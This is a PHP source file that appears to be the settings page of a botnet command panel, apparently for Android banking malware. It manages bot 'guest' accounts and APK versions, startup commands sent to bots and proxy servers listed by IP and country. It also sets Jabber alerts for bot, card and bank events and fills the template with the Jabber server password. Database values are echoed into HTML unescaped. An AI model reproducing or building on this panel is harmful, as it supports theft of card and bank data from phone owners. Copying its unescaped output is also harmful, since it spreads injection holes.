<?php session_start();
include '../db.php';
if (!(isset($_SESSION['user_id']))) {
    header("Location: ../index.php");
    return;
}
include 'XMPPHP/creds.php';
# variables
$html = '';
$html_guests = '';
$html_commands = '';
$html_proxy_servers = '';

$get_guests_sql = "SELECT * FROM `guest`";
$get_guests_sql_res = $mysqli->query($get_guests_sql);

while ($guest = mysqli_fetch_assoc($get_guests_sql_res)) {
    #var_dump($guest);
    $id = $guest["guest_id"];
    $user_login = $guest["user_login"];
    $apk_ver = $guest["apk_version"];
    $html_guests .= "<tr>";
    $html_guests .= "<td class='mdl-data-table__cell--non-numeric'>
                        <input name='guest_name_$id' type='text' id='guest_name_$id' value='$user_login'>
                        <label for='guest_name_$id'>Guest name</label><br><br>
                        <input name='guest_pass_$id' type='password' id='guest_pass_$id'>
                        <label for='guest_pass_$id'>Guest password</label><br><br>
                        <input name='guest_ver_$id' type='text' id='guest_ver_$id' value='$apk_ver'>
                        <label for='guest_ver_$id'>apk version</label><br><br>
                        <button style='background-color: black; color: white;' onclick='update_guest_settings(\"$id\")' class='mdl-button mdl-js-button mdl-button--raised'>
                        <i class='material-icons'>verified_user</i>Update</button>
                        <button style='background-color: black; color: white;' onclick='delete_guest_settings(\"$id\")' class='mdl-button mdl-js-button mdl-button--raised'>
                        <i class='material-icons'>cancel</i>Delete</button>
                    </td>
                </tr>";
}


# get startup settings here
$get_command_list_sql = "SELECT * FROM `com_config` WHERE `priority` < 10";
$get_command_list_sql_res = $mysqli->query($get_command_list_sql);

while ($command = mysqli_fetch_assoc($get_command_list_sql_res)) {
    #var_dump($guest);
    $command_id = $command["id"];
    $command_name = $command["name"];
    $command_text = $command["text"];
    $command_desc = $command["description"];
    $command_startup = $command["startup"];
    $command_hidden = "<input type='hidden' id='id' value='$command_id'>";
    $html_selected = "class='is-selected'";
    if (intval($command["number"]) > 0) $command_st_num = $command["startup_number"];
    if (intval($command["number"]) > 1) $command_st_txt = $command["startup_text"];

    if ($command_startup == 1) $html_commands .= "<tr $html_selected>";
    else $html_commands .= "<tr>";
    $html_commands .= "<td>$command_text$command_hidden</td>
                          <td>$command_desc</td>";
    if (intval($command["number"])>0) {
        $html_commands .= "<td><input type='text' id='startup_cmd_number_$command_id' value='$command_st_num'>
                            <label for='task_package'></label></td>";
    } else {
        $html_commands .= "<td></td>";
    }
    if (intval($command["number"])>1) {
        $html_commands .= "<td><input type='text' id='startup_cmd_txt_$command_id' value='$command_st_txt'>
                            <label for='task_package'></label></td>";
    } else {
        $html_commands .= "<td></td>";
    }
    $html_commands .= "</tr>";
}


# get proxy servers list
$get_proxy_servers_sql = "SELECT * FROM `proxy_servers`";
$get_proxy_servers_sql_res = $mysqli->query($get_proxy_servers_sql);

while ($row = mysqli_fetch_assoc($get_proxy_servers_sql_res)) {
    #var_dump($guest);
    $srv_id = $row["id"];
    $srv_ip = $row["ip"];
    $srv_user = $row["user"];
    $srv_time = $row["time"];
    $srv_country = $row["country"];
    $srv_note = $row["note"];
    $srv_status = $row["status"];
    $srv_status_txt = $row["status_text"];

    if($srv_country == ""){
        $country_img="../admin/images/country/_unknown.png";
    }else{
        $country_img="../admin/images/country/$srv_country.png";
    }
    if ($srv_status){
        $status_img = '<div id="'.$srv_id.'_check" class="mdl-color-text--green-400 material-icons">check_circle</div>';
    } else {
        $status_img = '<div id="'.$srv_id.'_check" class="mdl-color-text--red-400 material-icons">highlight_off</div>';
    }

    $html_proxy_servers .= "<tr>";
    $html_proxy_servers .= "<td>$srv_id</td><td>$srv_ip</td><td><center><a title='$country'><img src=$country_img width='16px'/></a></center></td><td>$srv_user</td><td>".date(DATE_ATOM,$srv_time)."</td>";
    $html_proxy_servers .= "<td><input name='srv_note_$srv_id' type='text' id='srv_note_$srv_id' value='$srv_note'></td><td><div style='cursor: pointer;' onclick='update_proxy_note($srv_id);'><i class='material-icons md-18' >system_update_alt</i></td>";
    $html_proxy_servers .= '<td><div id="'.$srv_id.'_help" class="mdl-color-text-400 material-icons">help</div>'.$status_img.'<div id="'.$srv_id.'_kill" onclick="delete_proxy_server('.$srv_id.');" class="mdl-color-text-400 material-icons" style="cursor: pointer;">delete</div></td>';
    $html_proxy_servers .= "</tr>";

    $html_proxy_servers .= '<div class="mdl-tooltip mdl-tooltip--large" for="'.$srv_id.'_help">'.$srv_status_txt.'</div>';
      #$html_bottom_links .= '<div class="mdl-tooltip mdl-tooltip" for="'.$id.'_kill">kill connection</div>';

}

# get jabber address for notification
$jabber_html = '';
$get_jabber_address_sql = "SELECT * FROM `jabber_notifications`";
$get_jabber_address_sql_res = $mysqli->query($get_jabber_address_sql);

function get_notification_status_html($jabber_notify=0){
    if($jabber_notify == 1){
          $icon_jabber='<div class="material-icons md-18">notifications_active</div>';
    }else{
          $icon_jabber='<div class="material-icons md-18">notifications_none</div>';
    }
    return $icon_jabber;
}

while ($jabber_row = mysqli_fetch_assoc($get_jabber_address_sql_res)) {
    $j_address = $jabber_row["address"];
    $j_id = $jabber_row["id"];
    $j_bot_event = get_notification_status_html($jabber_row["bot_event"]);
    $j_card_event = get_notification_status_html($jabber_row["card_event"]);
    $j_bank_event = get_notification_status_html($jabber_row["bank_event"]);
    $j_ded_event = get_notification_status_html($jabber_row["dedicated_event"]);
    $jabber_html .= "<tr>";
    $jabber_html .= "<td>$j_address</td>";
    $jabber_html .= "<td>$j_bot_event</td>";
    $jabber_html .= "<td>$j_card_event</td>";
    $jabber_html .= "<td>$j_bank_event</td>";
    $jabber_html .= "<td>$j_ded_event</td>";
    $jabber_html .= "<td><button style='background-color: black; color: white;' onclick='delete_jabber_address(\"$j_id\")' class='mdl-button mdl-js-button mdl-button--raised'>
                        <i class='material-icons'>cancel</i>Delete</button></td>";
    $jabber_html .= "</tr>";
}

$html = file_get_contents("templates/settings.tpl");
$html = str_replace('%%PLACE_GUESTS_HERE%%', $html_guests, $html);
$html = str_replace('%%PLACE_STURTUP_COMMANDS_HERE%%', $html_commands, $html);
$html = str_replace('%%PLACE_PROXY_SERVERS_HERE%%', $html_proxy_servers, $html);
$html = str_replace('%%PLACE_JABBER_CLIENTS_HERE%%', $jabber_html, $html);

$html = str_replace('%%PLACE_JSERVER_HERE%%', $jabber_main_server, $html);
$html = str_replace('%%PLACE_JPORT_HERE%%', $jabber_main_port, $html);
$html = str_replace('%%PLACE_JLOGIN_HERE%%', $jabber_main_login, $html);
$html = str_replace('%%PLACE_JPASS_HERE%%', $jabber_main_pass, $html);
$html = str_replace('%%PLACE_JDOMAIN_HERE%%', $jabber_main_domain, $html);

#$html = str_replace('%%PLACE_YOU_TABLE2_HERE%%', $html_table2, $html);

echo $html;

?>
